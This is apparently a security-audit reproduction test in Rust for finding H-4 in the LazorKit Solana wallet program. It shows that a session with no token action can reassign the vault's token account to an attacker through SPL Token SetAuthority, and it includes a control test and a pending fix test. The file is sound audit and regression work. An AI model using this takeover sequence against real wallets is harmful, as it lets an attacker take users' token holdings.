//! Reproduction for finding H-4 — the session token-authority freeze only
//! covers mints that appear in a token action, so the common session shape
//! (`SolLimit` + `ProgramWhitelist`, no token action) has no protection at all.
//!
//! `actions.rs:196-207`
//! ```ignore
//! if mints.is_empty() {
//!     return Ok(Vec::new());   // <- nothing snapshotted, nothing verified
//! }
//! ```
//!
//! `snapshot_token_authorities` collects mints from `TokenLimit`,
//! `TokenRecurringLimit` and `TokenMaxPerTx`. With none present it returns
//! early, `verify_token_authorities_unchanged` iterates an empty slice, and a
//! session can `SetAuthority(AccountOwner)` on any vault-owned token account.
//! No lamports move, so `SolLimit` never fires either.
//!
//! `h4_a` is the control: list the mint and the identical instruction is
//! rejected with 3032. The guard exists; it is simply gated on the wrong thing.
//!
//! Run:  cargo test --features devnet -p lazorkit-program --test repro_h4_token_authority

mod common;

use common::*;
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::Keypair,
    signer::Signer,
};

/// `AuthError::SessionTokenAuthorityChanged`
const ERR_TOKEN_AUTHORITY_CHANGED: u32 = 3032;

struct TokenFixture {
    mint: Pubkey,
    vault_token_account: Pubkey,
}

fn setup_tokens(context: &mut TestContext, wallet: &WalletFixture, amount: u64) -> TokenFixture {
    let mint = Pubkey::new_unique();
    let vault_token_account = Pubkey::new_unique();

    create_mint(&mut context.svm, mint, Pubkey::new_unique(), amount);
    create_token_account(
        &mut context.svm,
        vault_token_account,
        mint,
        wallet.vault_pda, // the vault owns the tokens
        amount,
    );

    TokenFixture {
        mint,
        vault_token_account,
    }
}

/// Account list for a session `Execute` whose inner instruction targets SPL
/// Token.
///
/// Index layout:
///   `0` payer · `1` wallet · `2` session PDA · `3` vault
///   `4` SPL Token program · `5` vault's token account · `6` session key
fn token_execute_accounts(
    context: &TestContext,
    wallet: &WalletFixture,
    session_pda: Pubkey,
    session: &Keypair,
    token_account: Pubkey,
) -> Vec<AccountMeta> {
    with_protocol_fee_accounts(
        vec![
            AccountMeta::new(context.payer.pubkey(), true),
            AccountMeta::new_readonly(wallet.wallet_pda, false),
            AccountMeta::new(session_pda, false),
            AccountMeta::new(wallet.vault_pda, false),
            AccountMeta::new_readonly(spl_token_id(), false),
            AccountMeta::new(token_account, false),
            AccountMeta::new_readonly(session.pubkey(), true),
        ],
        context,
    )
}

/// `Execute` data: one inner `SetAuthority(AccountOwner -> new_owner)` on
/// account 5, authorized by account 3 (the vault, which LazorKit signs for).
fn set_authority_execute_data(new_owner: Pubkey) -> Vec<u8> {
    let mut data = vec![4u8]; // Execute
    data.extend_from_slice(&encode_compact(&[(
        4,          // program_id_index -> SPL Token
        vec![5, 3], // [account_to_change, current_authority]
        spl_set_authority_data(2, new_owner), // 2 = AccountOwner
    )]));
    data
}

// ─────────────────────────────────────────────────────────────────────────
// H-4a — CONTROL: with the mint listed, the guard fires
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn h4_a_control_listed_mint_blocks_set_authority() {
    let mut context = setup_test();
    let wallet = create_ed25519_wallet(&mut context, 100_000_000);
    let tokens = setup_tokens(&mut context, &wallet, 1_000_000);

    // Session lists the mint, so `snapshot_token_authorities` has work to do.
    let mut actions = action_sol_limit(1_000_000);
    actions.extend_from_slice(&action_program_whitelist(spl_token_id()));
    actions.extend_from_slice(&action_token_limit(tokens.mint, 1_000));
    let session = create_session_with_actions(&mut context, &wallet, &actions);
    let session_pda = session_pda_for(context.program_id, &wallet, &session);

    let attacker = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();

    let ix = Instruction {
        program_id: context.program_id,
        accounts: token_execute_accounts(
            &context,
            &wallet,
            session_pda,
            &session,
            tokens.vault_token_account,
        ),
        data: set_authority_execute_data(attacker),
    };

    assert_custom_error(
        try_send(&mut context.svm, &payer, &[ix], &[&payer, &session]),
        ERR_TOKEN_AUTHORITY_CHANGED,
        "H-4a: with the mint listed, SetAuthority is caught post-CPI",
    );

    assert_eq!(
        token_account_owner(&context.svm, tokens.vault_token_account),
        wallet.vault_pda,
        "H-4a: the vault still owns its tokens"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// H-4b — drop the token action and the guard disappears
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn h4_b_unlisted_mint_allows_token_account_takeover() {
    let mut context = setup_test();
    let wallet = create_ed25519_wallet(&mut context, 100_000_000);
    let token_amount = 1_000_000;
    let tokens = setup_tokens(&mut context, &wallet, token_amount);

    // The everyday session shape: a SOL allowance and a program whitelist.
    // No token action, because the owner was not thinking about tokens —
    // which is exactly when they most need the guard.
    let mut actions = action_sol_limit(1_000_000);
    actions.extend_from_slice(&action_program_whitelist(spl_token_id()));
    let session = create_session_with_actions(&mut context, &wallet, &actions);
    let session_pda = session_pda_for(context.program_id, &wallet, &session);

    let attacker = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();
    let actions_before = session_actions(&context.svm, session_pda);

    let ix = Instruction {
        program_id: context.program_id,
        accounts: token_execute_accounts(
            &context,
            &wallet,
            session_pda,
            &session,
            tokens.vault_token_account,
        ),
        data: set_authority_execute_data(attacker),
    };

    try_send(&mut context.svm, &payer, &[ix], &[&payer, &session])
        .expect("H-4b: identical instruction to h4_a, but no token action was listed");

    assert_eq!(
        token_account_owner(&context.svm, tokens.vault_token_account),
        attacker,
        "H-4b: the attacker now owns the vault's token account outright"
    );

    // The token balance never moved, so nothing the session model watches
    // registered anything at all.
    assert_eq!(
        session_actions(&context.svm, session_pda),
        actions_before,
        "H-4b: SolLimit.remaining unchanged — zero lamports moved"
    );

    // The takeover is complete and survives the session: the attacker can
    // transfer the tokens whenever they like, with no LazorKit involvement.
    let data = context
        .svm
        .get_account(&tokens.vault_token_account)
        .expect("token account")
        .data;
    assert_eq!(
        u64::from_le_bytes(data[64..72].try_into().unwrap()),
        token_amount,
        "H-4b: all {token_amount} tokens are still sitting there, now under the attacker's key"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// H-4c — the fix, stated as a test
// ─────────────────────────────────────────────────────────────────────────

/// After `snapshot_token_authorities` stops early-returning on
/// `mints.is_empty()` and instead snapshots every vault-owned token account in
/// the account list, `h4_b` is rejected the same way `h4_a` is.
#[test]
#[ignore = "enable together with the snapshot_token_authorities fix; fails until then"]
fn h4_c_unlisted_mint_should_also_be_protected() {
    let mut context = setup_test();
    let wallet = create_ed25519_wallet(&mut context, 100_000_000);
    let tokens = setup_tokens(&mut context, &wallet, 1_000_000);

    let mut actions = action_sol_limit(1_000_000);
    actions.extend_from_slice(&action_program_whitelist(spl_token_id()));
    let session = create_session_with_actions(&mut context, &wallet, &actions);
    let session_pda = session_pda_for(context.program_id, &wallet, &session);

    let attacker = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();

    let takeover = Instruction {
        program_id: context.program_id,
        accounts: token_execute_accounts(
            &context,
            &wallet,
            session_pda,
            &session,
            tokens.vault_token_account,
        ),
        data: set_authority_execute_data(attacker),
    };
    assert_custom_error(
        try_send(&mut context.svm, &payer, &[takeover], &[&payer, &session]),
        ERR_TOKEN_AUTHORITY_CHANGED,
        "H-4c: SetAuthority must be caught even when no mint is listed",
    );

    assert_eq!(
        token_account_owner(&context.svm, tokens.vault_token_account),
        wallet.vault_pda,
        "H-4c: vault keeps its token account"
    );
    assert_eq!(
        token_account_delegate(&context.svm, tokens.vault_token_account),
        None,
        "H-4c: and no delegate was slipped in"
    );

    // Ordinary SOL spending inside the allowance must still work.
    advance(&mut context.svm);
    let destination = Pubkey::new_unique();
    let mut data = vec![4u8];
    data.extend_from_slice(&encode_compact(&[(
        4,
        vec![3, 5],
        system_transfer_data(500_000),
    )]));
    let ix = Instruction {
        program_id: context.program_id,
        accounts: with_protocol_fee_accounts(
            vec![
                AccountMeta::new(payer.pubkey(), true),
                AccountMeta::new_readonly(wallet.wallet_pda, false),
                AccountMeta::new(session_pda, false),
                AccountMeta::new(wallet.vault_pda, false),
                AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
                AccountMeta::new(destination, false),
                AccountMeta::new_readonly(session.pubkey(), true),
            ],
            &context,
        ),
        data,
    };
    // The whitelist only permits SPL Token, so this is expected to be refused
    // for that reason — the point is that it is not refused for a *token
    // authority* reason, i.e. the fix did not break unrelated paths.
    let err = try_send(&mut context.svm, &payer, &[ix], &[&payer, &session]);
    assert!(err.is_err(), "H-4c: System Program is not whitelisted here");
}
